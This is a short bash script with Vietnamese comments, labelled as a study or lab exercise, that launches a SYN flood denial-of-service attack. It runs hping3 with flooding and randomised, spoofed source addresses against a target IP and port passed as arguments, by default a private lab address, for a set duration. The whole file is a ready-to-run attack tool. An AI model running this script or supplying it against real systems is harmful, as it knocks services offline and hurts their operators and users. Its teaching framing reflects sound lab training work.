#!/bin/bash
# ============================================
# Script: SYN Flood Attack (Layer 3/4 DDoS)
# Mục đích: Học tập / bài tập ATT
# Dùng: hping3
# ============================================

VICTIM_IP=${1:-"192.168.100.10"}
VICTIM_PORT=${2:-8080}
DURATION=${3:-30}

echo "========================================"
echo " SYN FLOOD ATTACK - MÔ PHỎNG DDoS"
echo "========================================"
echo " Target    : $VICTIM_IP:$VICTIM_PORT"
echo " Duration  : ${DURATION}s"
echo " Tool      : hping3"
echo "========================================"
echo ""
echo "[*] Bắt đầu SYN Flood (cần quyền root)..."

# SYN Flood với hping3
# -S: SYN packet
# --flood: gửi càng nhanh càng tốt
# -p: port đích
# --rand-source: IP nguồn ngẫu nhiên (spoofing)
timeout $DURATION hping3 -S --flood -p $VICTIM_PORT --rand-source $VICTIM_IP

echo ""
echo "[*] SYN Flood hoàn tất sau ${DURATION}s"
